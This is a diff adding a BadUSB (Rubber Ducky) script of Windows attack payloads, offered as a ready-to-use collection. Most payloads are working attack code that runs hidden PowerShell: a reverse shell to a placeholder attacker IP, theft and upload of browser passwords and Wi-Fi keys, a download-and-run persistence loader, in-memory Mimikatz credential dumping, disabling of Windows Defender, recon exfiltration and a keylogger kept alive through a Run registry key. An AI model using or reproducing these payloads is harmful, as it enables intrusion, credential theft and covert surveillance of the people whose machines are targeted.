@@ -1,0 +1,150 @@
+REM ===============================================================================
+REM  NULLSEC BADUSB - Windows Payload Collection
+REM  For Hak5 Rubber Ducky / USB Armory / BadUSB devices
+REM ===============================================================================
+
+REM ====== PAYLOAD 1: QUICK REVERSE SHELL ======
+REM Establishes PowerShell reverse shell in under 5 seconds
+
+DELAY 500
+GUI r
+DELAY 300
+STRING powershell -w hidden -ep bypass -c "$c=New-Object Net.Sockets.TCPClient('ATTACKER_IP',4444);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$r2=$r+'PS '+(pwd).Path+'> ';$sb=([text.encoding]::ASCII).GetBytes($r2);$s.Write($sb,0,$sb.Length);$s.Flush()}"
+ENTER
+
+
+REM ====== PAYLOAD 2: CREDENTIAL HARVESTER ======
+REM Dumps saved browser credentials and sends to attacker
+
+DELAY 500
+GUI r
+DELAY 300
+STRING powershell -w hidden -ep bypass
+ENTER
+DELAY 500
+STRING $d="$env:TEMP\loot";mkdir $d -ea 0
+ENTER
+STRING # Chrome passwords
+ENTER
+STRING Copy-Item "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data" "$d\chrome_logins.db" -ea 0
+ENTER
+STRING # Firefox profiles
+ENTER
+STRING Copy-Item "$env:APPDATA\Mozilla\Firefox\Profiles\*\logins.json" "$d\" -ea 0
+ENTER
+STRING Copy-Item "$env:APPDATA\Mozilla\Firefox\Profiles\*\key4.db" "$d\" -ea 0
+ENTER
+STRING # WiFi passwords
+ENTER
+STRING netsh wlan export profile key=clear folder="$d" | Out-Null
+ENTER
+STRING # Compress and exfil
+ENTER
+STRING Compress-Archive -Path $d -DestinationPath "$d.zip" -Force
+ENTER
+STRING Invoke-WebRequest -Uri "http://ATTACKER_IP:8080/upload" -Method POST -InFile "$d.zip"
+ENTER
+STRING Remove-Item $d,$d.zip -Recurse -Force
+ENTER
+STRING exit
+ENTER
+
+
+REM ====== PAYLOAD 3: PERSISTENCE INSTALLER ======
+REM Installs multiple persistence mechanisms
+
+DELAY 500
+GUI r
+DELAY 300
+STRING powershell -w hidden -ep bypass -c "iex(iwr http://ATTACKER_IP/persist.ps1 -UseBasicParsing)"
+ENTER
+
+
+REM ====== PAYLOAD 4: MIMIKATZ MEMORY DUMP ======
+REM Downloads and executes Mimikatz in memory
+
+DELAY 500
+GUI r
+DELAY 300
+STRING powershell -w hidden -ep bypass
+ENTER
+DELAY 300
+STRING IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1')
+ENTER
+DELAY 1000
+STRING Invoke-Mimikatz -DumpCreds | Out-File "$env:TEMP\creds.txt"
+ENTER
+STRING Invoke-WebRequest -Uri "http://ATTACKER_IP:8080/upload" -Method POST -InFile "$env:TEMP\creds.txt"
+ENTER
+STRING Remove-Item "$env:TEMP\creds.txt" -Force
+ENTER
+STRING exit
+ENTER
+
+
+REM ====== PAYLOAD 5: DISABLE DEFENDER ======
+REM Disables Windows Defender (requires admin)
+
+DELAY 500
+GUI r
+DELAY 300
+STRING powershell Start-Process powershell -Verb runAs -ArgumentList '-w hidden -c "Set-MpPreference -DisableRealtimeMonitoring $true; Set-MpPreference -DisableBehaviorMonitoring $true; Set-MpPreference -DisableBlockAtFirstSeen $true; Set-MpPreference -DisableIOAVProtection $true; Set-MpPreference -DisablePrivacyMode $true; Set-MpPreference -DisableScriptScanning $true"'
+ENTER
+DELAY 1000
+ALT y
+ENTER
+
+
+REM ====== PAYLOAD 6: FULL SYSTEM RECON ======
+REM Comprehensive system information gathering
+
+DELAY 500
+GUI r
+DELAY 300
+STRING cmd /c start /min powershell -w hidden -ep bypass -c "$o='$env:TEMP\recon.txt';'=== SYSTEM INFO ===' | Out-File $o;systeminfo | Out-File $o -Append;'`n=== NETWORK ===' | Out-File $o -Append;ipconfig /all | Out-File $o -Append;netstat -ano | Out-File $o -Append;'`n=== USERS ===' | Out-File $o -Append;net user | Out-File $o -Append;net localgroup administrators | Out-File $o -Append;'`n=== PROCESSES ===' | Out-File $o -Append;Get-Process | Out-File $o -Append;'`n=== INSTALLED SOFTWARE ===' | Out-File $o -Append;Get-WmiObject -Class Win32_Product | Select Name,Version | Out-File $o -Append;Invoke-WebRequest -Uri 'http://ATTACKER_IP:8080/upload' -Method POST -InFile $o;Remove-Item $o -Force"
+ENTER
+
+
+REM ====== PAYLOAD 7: KEYLOGGER INSTALL ======
+REM Installs persistent keylogger
+
+DELAY 500
+GUI r
+DELAY 300
+STRING powershell -w hidden -ep bypass
+ENTER
+DELAY 300
+STRING $k=@'
+ENTER
+STRING Add-Type -TypeDefinition @"
+ENTER
+STRING using System;using System.Runtime.InteropServices;using System.Windows.Forms;
+ENTER
+STRING public class KL{[DllImport("user32.dll")]public static extern int GetAsyncKeyState(Int32 i);
+ENTER
+STRING public static void Main(){string l="";while(true){System.Threading.Thread.Sleep(10);
+ENTER
+STRING for(Int32 i=0;i<255;i++){int s=GetAsyncKeyState(i);if(s==32769){l+=((Keys)i).ToString();}}
+ENTER
+STRING if(l.Length>100){System.IO.File.AppendAllText(Environment.GetEnvironmentVariable("TEMP")+"\\kl.txt",l);l="";}}}}"@
+ENTER
+STRING '@
+ENTER
+STRING $k|Out-File "$env:TEMP\kl.ps1"
+ENTER
+STRING $a='powershell -w hidden -ep bypass -f "$env:TEMP\kl.ps1"'
+ENTER
+STRING Set-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Name 'SysHelper' -Value $a
+ENTER
+STRING exit
+ENTER
+
+
+REM ====== PAYLOAD 8: RANSOMWARE SIMULATOR (SAFE) ======
+REM Educational ransomware demo - DOES NOT ENCRYPT, just shows warning
+
+DELAY 500
+GUI r
+DELAY 300
+STRING mshta "javascript:var sh=new ActiveXObject('WScript.Shell');sh.Popup('NULLSEC RANSOMWARE DEMO\\n\\nThis is a demonstration.\\nNo files were harmed.\\n\\nIn a real attack, your files would be encrypted.',0,'NULLSEC',48);close()"
+ENTER
